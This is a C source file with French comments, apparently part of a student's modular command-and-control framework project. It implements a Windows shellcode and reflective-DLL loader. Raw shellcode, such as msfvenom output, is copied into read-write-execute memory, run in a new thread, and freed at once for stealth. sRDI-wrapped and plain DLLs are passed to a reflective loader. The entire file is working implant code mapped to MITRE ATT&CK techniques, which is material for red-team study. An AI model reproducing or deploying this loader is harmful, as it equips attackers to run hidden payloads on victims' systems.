/*
 * ============================================================
 *  shellcode_loader.c — Chargeur de shellcode / sRDI (T1059)
 *
 *  MITRE ATT&CK : T1059 (Command and Script Interpreter)
 *                 T1620 (Reflective Code Loading — variante raw)
 *
 *  Trois modes d'entrée détectés automatiquement :
 *
 *  MODE 1 — sRDI (Shellcode Reflective DLL Injection)
 *    Format : [SRDI][v][arch][0x00][0x00] + bytes DLL
 *    Action : strip du header 8 bytes → rdll_loader_execute()
 *    Usage  : module sysinfo -t shellcode (après make shellcode-convert)
 *
 *  MODE 2 — PE/DLL brut (fallback sRDI)
 *    Format : MZ (magic PE)
 *    Action : passage direct à rdll_loader_execute()
 *    Usage  : si le .bin est une DLL non-wrappée
 *
 *  MODE 3 — Shellcode brut (PIC, position-independent code)
 *    Format : raw bytes (pas d'en-tête PE/COFF)
 *    Action : VirtualAlloc RWX + memcpy + CreateThread
 *    Usage  : msfvenom -f raw, shellcode artisanal
 *
 *  Flux d'exécution (mode 3 uniquement, modes 1/2 → rdll_loader.c) :
 *    1. VirtualAlloc(NULL, size, RWX)
 *    2. memcpy(base, sc_bytes, size)
 *    3. CreateThread(sc_thread_proc, &ctx)
 *    4. WaitForSingleObject(timeout=10s)
 *    5. GetExitCodeThread
 *    6. VirtualFree(base)  — libération immédiate (furtif)
 *    7. Récupérer sortie beacon ou message de statut
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "platform.h"
#include "shellcode_loader.h"
#include "rdll_loader.h"
#include "beacon_compatibility.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
 *  IMPLÉMENTATION WINDOWS
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>

/* ── Format sRDI ────────────────────────────────────────────── *
 * Header 8 bytes :                                              *
 *   [0-3] : "SRDI"    magic (4 bytes)                          *
 *   [4]   : version   (0x00)                                   *
 *   [5]   : arch      (0x40 = x64, 0x20 = x86)                 *
 *   [6-7] : réservé   (0x00 0x00)                              *
 * Bytes suivants : DLL complète (PE valide)                    */
#define SRDI_MAGIC      "SRDI"
#define SRDI_MAGIC_LEN  4
#define SRDI_HDR_SIZE   8
#define SRDI_ARCH_X64   0x40
#define SRDI_ARCH_X86   0x20

/* Timeout d'attente du thread shellcode brut (ms) */
#define SC_EXEC_TIMEOUT_MS  10000

/* ── Contexte thread shellcode brut ─────────────────────────── */
typedef struct {
    BYTE              *base;
    const unsigned char *args;
    size_t             args_len;
} sc_ctx_t;

/* ── ThreadProc : appelle le shellcode brut ─────────────────── */
static DWORD WINAPI sc_thread_proc(LPVOID param) {
    sc_ctx_t *ctx = (sc_ctx_t *)param;
    typedef void (*sc_fn_t)(void *);
    ((sc_fn_t)ctx->base)((void *)ctx->args);
    return 0;
}

/* ── Erreur rapide ──────────────────────────────────────────── */
static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* ── Exécution d'un shellcode brut (mode 3) ─────────────────── */
static module_result_t exec_raw_shellcode(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len
) {
    printf("[SC] Mode 3 : shellcode brut (%zu bytes)\n", sc_size);
    printf("[SC] Premiers bytes : %02X %02X %02X %02X\n",
           sc_bytes[0], sc_bytes[1], sc_bytes[2], sc_bytes[3]);
    fflush(stdout);

    /* Allocation RWX */
    BYTE *base = (BYTE *)VirtualAlloc(
        NULL, sc_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
    if (!base) {
        printf("[SC] ERREUR: VirtualAlloc(%zu) — err %lu\n",
               sc_size, (unsigned long)GetLastError());
        return make_error("[SC] VirtualAlloc RWX échoué");
    }
    printf("[SC] VirtualAlloc RWX @ %p (%zu bytes)\n", (void *)base, sc_size);
    fflush(stdout);

    memcpy(base, sc_bytes, sc_size);
    beacon_reset_output();

    /* Exécution dans un thread dédié */
    sc_ctx_t ctx = { base, args, args_len };
    printf("[SC] CreateThread @ %p ...\n", (void *)base);
    fflush(stdout);

    HANDLE hThread = CreateThread(NULL, 0, sc_thread_proc, &ctx, 0, NULL);
    if (!hThread) {
        VirtualFree(base, 0, MEM_RELEASE);
        return make_error("[SC] CreateThread échoué");
    }

    DWORD wait_res  = WaitForSingleObject(hThread, SC_EXEC_TIMEOUT_MS);
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);

    const char *wait_str = (wait_res == WAIT_OBJECT_0) ? "OK" : "TIMEOUT";
    printf("[SC] Thread %s — exit_code=%lu\n", wait_str, (unsigned long)exit_code);
    fflush(stdout);

    /* Libération immédiate (mode furtif) */
    VirtualFree(base, 0, MEM_RELEASE);
    printf("[SC] VirtualFree @ %p — région libérée\n", (void *)base);
    fflush(stdout);

    /* Construction du résultat */
    module_result_t result = {0};
    beacon_output_t *bout  = beacon_get_output();

    if (bout && bout->buffer && bout->length > 0) {
        result.data = (unsigned char *)malloc(bout->length + 1);
        if (result.data) {
            memcpy(result.data, bout->buffer, bout->length);
            result.data[bout->length] = '\0';
            result.data_len = bout->length;
        }
    } else {
        char msg[256];
        snprintf(msg, sizeof(msg),
                 "[SC] Shellcode brut exécuté : %zu bytes | exit=%lu | %s",
                 sc_size, (unsigned long)exit_code, wait_str);
        result.data = (unsigned char *)malloc(strlen(msg) + 1);
        if (result.data) {
            memcpy(result.data, msg, strlen(msg) + 1);
            result.data_len = strlen(msg);
        }
    }
    result.status = (wait_res == WAIT_OBJECT_0) ? 0 : -1;
    return result;
}


/* ============================================================
 *  shellcode_execute — point d'entrée public
 * ============================================================ */
module_result_t shellcode_execute(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len
) {
    if (!sc_bytes || sc_size < 4)
        return make_error("[SC] Données invalides ou vides");

    printf("[SC] ── Shellcode Loader (T1059) ─────────────────────\n");
    printf("[SC] Taille   : %zu bytes\n", sc_size);
    fflush(stdout);

    /* ── MODE 1 : sRDI — header "SRDI" + DLL bytes ─────────── *
     * Converti par server/srdi.py depuis une DLL réflective.   *
     * On strip les 8 bytes de header et on délègue au RDLL     *
     * loader qui fait le chargement PE complet en mémoire.     */
    if (sc_size > SRDI_HDR_SIZE &&
        memcmp(sc_bytes, SRDI_MAGIC, SRDI_MAGIC_LEN) == 0)
    {
        uint8_t arch = sc_bytes[5];
        size_t  dll_size = sc_size - SRDI_HDR_SIZE;

        printf("[SC] Mode 1 : sRDI détecté\n");
        printf("[SC] Arch   : %s\n", (arch == SRDI_ARCH_X64) ? "x64" :
                                      (arch == SRDI_ARCH_X86) ? "x86" : "inconnu");
        printf("[SC] DLL    : %zu bytes (après strip header)\n", dll_size);
        printf("[SC] Délégation → rdll_loader_execute()\n");
        fflush(stdout);

        return rdll_loader_execute(sc_bytes + SRDI_HDR_SIZE, dll_size,
                                    args, args_len);
    }

    /* ── MODE 2 : PE/DLL brut — magic MZ ────────────────────── *
     * Le .bin est directement une DLL (pas de header sRDI).    *
     * Fallback : on passe directement à rdll_loader_execute(). */
    if (sc_size >= 2 && sc_bytes[0] == 'M' && sc_bytes[1] == 'Z') {
        printf("[SC] Mode 2 : PE/DLL brut détecté (MZ magic)\n");
        printf("[SC] Délégation → rdll_loader_execute() (sRDI fallback)\n");
        fflush(stdout);
        return rdll_loader_execute(sc_bytes, sc_size, args, args_len);
    }

    /* ── MODE 3 : shellcode brut PIC ────────────────────────── *
     * Bytes bruts sans en-tête PE/COFF.                        *
     * Exemples : msfvenom -f raw, shellcode artisanal.         */
    return exec_raw_shellcode(sc_bytes, sc_size, args, args_len);
}

/* ============================================================
 *  STUB LINUX
 * ============================================================ */
#else

module_result_t shellcode_execute(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len)
{
    (void)sc_bytes; (void)sc_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[SC] Non supporté sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
